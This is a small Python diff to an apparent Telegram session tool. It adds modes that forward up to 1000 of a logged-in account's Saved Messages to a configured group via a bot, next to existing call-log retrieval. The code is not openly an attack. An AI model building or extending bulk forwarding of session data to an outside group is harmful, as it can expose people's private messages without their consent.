@@ -448,6 +448,20 @@ class UserSession:
                  except Exception as e:
                      return f"Call Log Error: {e}"
 
+             if mode in ['saved', 'allsaved']:
+                 try:
+                     from config import CHATS_GROUP_ID
+                     limit = 50
+                     if mode == 'allsaved': limit = 1000
+                     
+                     bot_u = await self.bot.get_me()
+                     bot_username = bot_u.username
+                     
+                     # Forward from 'me' (Saved Messages)
+                     return await self.forward_chats('me', limit, bot_username, CHATS_GROUP_ID)
+                 except Exception as e:
+                     return f"Error fetching saved messages: {e}"
+
              me = await self.client.get_me()
              u_str = f"@{me.username}" if getattr(me, 'username', None) else (getattr(me, 'first_name', '') or 'User')
              
